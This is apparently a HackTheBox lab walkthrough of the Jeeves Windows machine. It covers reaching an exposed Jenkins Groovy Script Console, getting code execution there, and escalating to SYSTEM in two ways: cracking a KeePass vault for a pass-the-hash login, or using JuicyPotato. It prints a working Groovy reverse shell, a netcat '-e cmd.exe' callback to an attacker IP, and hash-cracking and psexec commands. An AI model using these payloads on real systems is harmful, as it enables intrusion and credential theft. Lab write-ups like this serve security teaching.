---
title: "HTB: Jeeves"
date: 2026-07-06
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "Jenkins", "Groovy", "KeePass", SeImpersonatePrivilege"]
categories: ["Writeups"]
description: "Walkthrough of the Jeeves Windows box: Jenkins enumeration, Groovy Script Console to RCE, SeImpersonatePrivilege abuse or KeePass Credential abuse to Admin."
os: Windows
difficulty: Easy
status: Complete
---

# 🚩 Box Name: Jeeves

## 📋 Initial Info

**Jeeves** is an easy Windows machine centered around exploiting an exposed Jenkins instance to gain remote code execution through the Groovy Script Console. After obtaining an initial foothold, the machine demonstrates two distinct privilege escalation paths: recovering credentials from a forgotten KeePass database to perform a Pass-the-Hash attack, or abusing **SeImpersonatePrivilege** with **JuicyPotato** to escalate directly to **NT AUTHORITY\SYSTEM**. It's an excellent introduction to Jenkins exploitation, Windows credential hunting, and classic local privilege escalation techniques.

---

## 🔍 Reconnaissance

The first thing I do is figure out what services the target is exposing. I start with a full TCP scan.

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

Running an aggressive scan (`-A`) against all 65,535 TCP ports (`-p-`) gives me both service detection and operating system fingerprinting in a single shot. It takes a little longer, but it usually saves time later.
#### Aggressive nmap scan
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-06 14:52 CDT
Nmap scan report for 10.129.228.112
Host is up (0.062s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|11|Phone (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 11 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m42s, deviation: 0s, median: 4h59m42s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-07-07T00:54:32
|_  start_date: 2026-07-07T00:36:52
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   62.31 ms 10.10.14.1
2   62.33 ms 10.129.228.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.96 seconds
```


The scan reveals four interesting ports:

|Port|Service|Notes|
|---|---|---|
|**80**|HTTP|Microsoft IIS 10.0 hosting a site called **"Ask Jeeves."**|
|**135**|MSRPC|Standard Windows RPC service. Nothing exciting yet, but it's useful to know it's there.|
|**445**|SMB|Windows file sharing. Always worth checking since SMB is a common attack surface.|
|**50000**|HTTP|A Jetty web server returning a generic 404 page. This immediately catches my attention because high-numbered HTTP ports often host administrative interfaces or internal applications.|

Nmap also gives me a few clues about the underlying operating system. The fingerprint isn't perfect, but it's pretty confident I'm dealing with a Windows machine. SMB reports the hostname as **JEEVES**, which lines up nicely with the website running on port 80.

A few other details stand out:
- SMB message signing is **enabled but not required**, which can sometimes open the door to relay attacks under the right conditions.
- SMBv1 is still enabled, which is another sign the machine may not be particularly hardened.
- The IIS server allows the **TRACE** HTTP method. While this isn't immediately useful, it's another interesting configuration detail to keep in the back of my mind.

Nothing solid yet, but the combination of IIS, SMB, and a Jetty server on port **50000** gives me several promising avenues to investigate.

### 📂 SMB Enumeration

Whenever I find SMB exposed, I always check whether anonymous or Guest access has been left enabled.

I start by attempting a null session:
```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ nxc smb 10.129.228.112 -u '' -p ''                                                                                                                                        ──(Mon,Jul06)─┘
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\: STATUS_ACCESS_DENIED
```

Sometimes administrators disable anonymous logins but forget about the built-in Guest account. I give that a try next:
```
┌─[split@parrot:~/Documents/HTB]
└─❯ nxc smb 10.129.228.112 -u 'GUEST' -p ''                                                                                                                                   ──(Mon,Jul06)─┘
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\GUEST: STATUS_ACCOUNT_DISABLED
```

This time the server responds with **STATUS_ACCOUNT_DISABLED**, confirming the Guest account exists but has been explicitly disabled.

It's not the pathway I was hoping for, but it's still useful information. I can confidently rule SMB out as an easy entry point and shift my attention to the web services instead.

### 🌐 Web Enumeration

#### Port 80

The website on port **80** is not very exciting. It serves a simple **"Ask Jeeves"** page with no obvious functionality, login forms, or hidden links worth poking at.

![Ask Jeeves](/images/jeeves/Jeeves.png)


Of course, appearances can be deceiving, so I try a little forced browsing to see if anything interesting is hiding beneath the surface.

```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.228.112/FUZZ                                                     ──(Mon,Jul06)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.112/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [26583/26583] :: Job [1/1] :: 311 req/sec :: Duration: [0:00:52] :: Errors: 1 ::
```

After working through the entire wordlist, FFUF comes up empty. No hidden directories, no backup files, no forgotten admin panels nothing. It looks like port 80 is a dead end.


#### Port 50000 (Jetty)

The web server listening on port **50000** is much more interesting.

Instead of a real webpage, browsing to the root of the site only returns a generic **HTTP ERROR 404** page. That usually means the server is running correctly, but I'm requesting a path that doesn't exist. In other words, there may still be a web application hiding somewhere underneath it.

![Port 500000](/images/jeeves/50000.png)

My first attempt is another directory brute-force using the same Raft wordlist.
```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.228.112:50000/FUZZ                                               ──(Mon,Jul06)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.112:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [26583/26583] :: Job [1/1] :: 361 req/sec :: Duration: [0:00:49] :: Errors: 1 ::
```


Once again, nothing. Different wordlists contain different directory names, so I swap to the much larger **DirBuster medium** list and try again.


```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.228.112:50000/FUZZ                                        ──(Mon,Jul06)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.112:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
:: Progress: [220559/220559] :: Job [1/1] :: 380 req/sec :: Duration: [0:06:51] :: Errors: 0 ::
```


This time I finally get a hit. Success! The server redirects me to the `/askjeeves` directory, revealing the application that was hiding behind that 404 page.


![Ask Jeeves Directory](/images/jeeves/askJeeves.png)

##### Jenkins

Visiting the new directory lands me on a **Jenkins** dashboard.

If you've never run into Jenkins before, it's an automation server used by developers to build, test, and deploy software. Instead of manually compiling code or deploying applications, developers create automated jobs that Jenkins executes for them.

The important thing from an attacker's perspective is that Jenkins often executes commands directly on the underlying operating system. If an attacker gains administrative access to Jenkins or if it's been misconfigured they can frequently turn that access into **remote code execution** on the server.

One feature that immediately catches my eye is the **Script Console**.

##### The Groovy Script Console

Jenkins includes a built-in **Script Console** for administrators. It's essentially a web-based terminal that executes **Groovy** scripts directly inside the Jenkins application.

Groovy is a programming language built on top of the Java platform. Since Jenkins itself is written in Java, Groovy has unrestricted access to the application's internal APIs and can even execute operating system commands.

In a properly secured Jenkins installation, only trusted administrators should ever have access to this console. If it's exposed without authentication, however, it's basically the server handing you the keys and saying, "Please don't break anything."

Finding an accessible Jenkins Script Console is a huge red flag because it often leads directly to full remote code execution.

![Script Console](/images/jeeves/scriptConsole.png)

---

## ⚡ Exploitation (Initial Access)

By navigating to `/askjeeves/script`, I'm presented with Jenkins' built-in Groovy Script Console. This page allows administrators to execute Groovy code directly on the server, which also means it can execute operating system commands.

At this point, I'm no longer looking for a vulnerability I already have one.

### Testing for Command Execution

Source: `https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76`

Before throwing a reverse shell at the target, I like to verify that command execution actually works. The following Groovy script launches **`cmd.exe`**, executes the `dir` command, and prints the output back to the browser.

```shell
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```


The important part is the first line:
```groovy
def cmd = "cmd.exe /c dir".execute();
```

The `.execute()` method tells Groovy to spawn a new process on the underlying Windows system. Since Jenkins is running with sufficient privileges, it executes whatever command I provide. If I can run `dir`, I can run just about anything. After clicking **Run**, the directory listing is returned in the browser, confirming that I have arbitrary command execution on the target.

### Getting a Reverse Shell

Command execution through a web page is useful, but typing one command at a time quickly gets old. An interactive shell is much more convenient.

A popular Groovy reverse shell payload written by **Frohoff** does exactly what I need. The script launches `cmd.exe`, opens a TCP connection back to my attack machine, and continuously forwards input and output between the two.

```shell
String host="10.10.14.182";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


Before running the payload, I start a Netcat listener on my attack machine. I click Run and Jenkins immediately reaches back to my listener.

```shell
┌─[split@parrot:~/Documents/HTB/Jeeves]
└─❯ nc -nvlp 1337                                                                                                                                                             ──(Mon,Jul06)─┘
Listening on 0.0.0.0 1337
Connection received on 10.129.228.112 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```


I have my first foothold on the machine.

The shell is running as **`jeeves\kohsuke`**, the account under which the Jenkins service is running. While it isn't **NT AUTHORITY\SYSTEM** yet, it's more than enough to begin exploring the host and looking for a path to privilege escalation.

## 🛡️ Privilege Escalation

With an initial shell as **`jeeves\kohsuke`**, it's time to look for a path to **SYSTEM**.

Interestingly, this machine offers two different privilege escalation techniques. The first abuses exposed credentials, while the second takes advantage of a classic Windows privilege escalation vulnerability.

### Method 1 – KeePass Database


One of the first places I check after landing on a Windows host is the current user's  Directories. I immediately find a KeePass database.

```shell
c:\Users\kohsuke>dir Documents
dir Documents
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,655,272,960 bytes free
```


A **`.kdbx`** file is a password vault created by **KeePass**, an open-source password manager. Rather than storing passwords in plain text, KeePass encrypts everything inside a single database protected by a master password.

If I can crack that master password, I gain access to every credential stored inside.

#### Transferring the Database

I use a simple smbserver to transfer the file I want.

![Transfering the Database](/images/jeeves/transfer.png)


Once copied to my attack machine I extract the password hash using **keepass2john**.

```shell
┌─[split@parrot:~/Documents/HTB/Jeeves/share]
└─❯ sudo keepass2john CEH.kdbx                                                ──(Mon,Jul06)─┘
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```


I next add this to a file called hash. 

With the hash extracted, I use **John the Ripper** using the `rockyou.txt` wordlist.


```shell
┌─[split@parrot:~/Documents/HTB/Jeeves/share]
└─❯ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash                ──(Mon,Jul06)─┘
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:52 DONE (2026-07-06 15:58) 0.01902g/s 1045p/s 1045c/s 1045C/s mwuah..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[split@parrot:~/Documents/HTB/Jeeves/share]
└─❯ sudo john --show hash                                                     ──(Mon,Jul06)─┘
CEH:moonshine1

1 password hash cracked, 0 left
```


Less than a minute later, John spits out the master password.

#### Opening the Database

Using the recovered password, I unlock the KeePass database.

![KeePass Database](/images/jeeves/keepassAuth.png)


Inside are several stored credentials, but one entry immediately stands out:
**Backup**

![Credentials](/images/jeeves/keepassDump.png)


Rather than containing a normal password, the entry stores what looks like an **NTLM hash**.

```text
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

This is exciting because Windows authentication doesn't always require the plaintext password. In many situations, the NTLM hash itself can be used for authentication through a technique known as **Pass-the-Hash (PtH).**

Before getting too excited, I verify that the hash actually belongs to the local Administrator account.

```shell
┌─[split@parrot:~/Documents/HTB/Jeeves/share]
└─❯ nxc smb 10.129.228.112 -u 'administrator' -H e0fb1fb85756c24235ff238cbe81fe00
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

Success.

NetExec confirms the hash is valid and authenticates successfully. Now that I have Administrator's NTLM hash, I don't need to crack it I can simply use it directly.

#### Pass-the-Hash

Impacket's **psexec.py** makes this easy.

```shell
┌─[split@parrot:~/Documents/HTB/Jeeves/share]
└─❯ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.228.112.....
[*] Found writable share ADMIN$
[*] Uploading file sWVrOaQf.exe
[*] Opening SVCManager on 10.129.228.112.....
[*] Creating service qGkE on 10.129.228.112.....
[*] Starting service qGkE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

I've gone from a Jenkins service account to **NT AUTHORITY\SYSTEM** without ever knowing the Administrator password.

### Method 2 – JuicyPotato


There's another route to SYSTEM that doesn't require touching the KeePass database at all. Running `whoami /priv` reveals something interesting.

```shell
c:\Users\kohsuke>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```


```text
SeImpersonatePrivilege    Enabled
```

Whenever I see **SeImpersonatePrivilege** enabled on an older version of Windows, one word immediately comes to mind: 

**Potato.**

#### What is JuicyPotato?

JuicyPotato is a local privilege escalation exploit that abuses the **SeImpersonatePrivilege** privilege. To understand why it works, it's helpful to know what this privilege does. Windows services often communicate with one another using **COM** (Component Object Model) objects. Some of these services run as **NT AUTHORITY\SYSTEM**.

Normally, if a SYSTEM service authenticates to another process, Windows allows that process to temporarily **impersonate** the SYSTEM client so it can perform work on its behalf.

JuicyPotato tricks one of these privileged COM services into authenticating to an attacker-controlled service instead. Once the authentication occurs, Windows hands over a SYSTEM impersonation token.

The exploit then uses that token to spawn a brand-new process running as **NT AUTHORITY\SYSTEM**.

In short:

1. Create a fake COM service.
2. Convince a legitimate SYSTEM process to authenticate to it.
3. Steal the SYSTEM token.
4. Launch a new process using that token.

That's why **SeImpersonatePrivilege** is so dangerous it allows Windows to trust the process enough to impersonate SYSTEM when the exploit succeeds.

#### Launching the Exploit

There are several ways to perform this attack. **Metasploit** can automate the entire process, but I will go the manual route because it makes it much easier to understand what's actually happening.

1. Start a Netcat listener on the attacker machine.
2. Uploading **JuicyPotato.exe** and a copy of Netcat to the target.
3. Execute the exploit.


```shell
c:\ProgramData>.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\programdata\nc.exe 10.10.14.182 444 -e cmd.exe" -t *
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\programdata\nc.exe 10.10.14.182 444 -e cmd.exe" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```


The output confirms everything worked as expected. JuicyPotato successfully steals a SYSTEM token and uses it to launch my Netcat reverse shell.

Back on my attack machine, my listener immediately receives a connection.

```shell
┌─[split@parrot:~/Documents/HTB/Jeeves/share]
└─❯ sudo nc -nvlp 444                                                      1 ↵ ──(Mon,Jul06)─┘
[sudo] password for split:
Listening on 0.0.0.0 444
Connection received on 10.129.228.112 49717
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```


![Exploit](/images/jeeves/JPExploit.png)

The End